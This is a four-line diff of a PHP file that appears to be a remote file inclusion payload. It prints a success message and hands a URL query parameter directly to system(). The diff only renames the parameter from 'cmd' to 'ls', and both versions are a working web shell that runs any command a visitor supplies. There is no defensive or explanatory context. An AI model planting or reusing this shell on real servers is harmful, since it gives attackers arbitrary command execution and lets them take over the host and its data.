@@ -1,4 +1,4 @@
 <?php
 echo 'Remote File Inclusion Successful!';
-system($_GET['cmd']);
+system($_GET['ls']);
 ?>
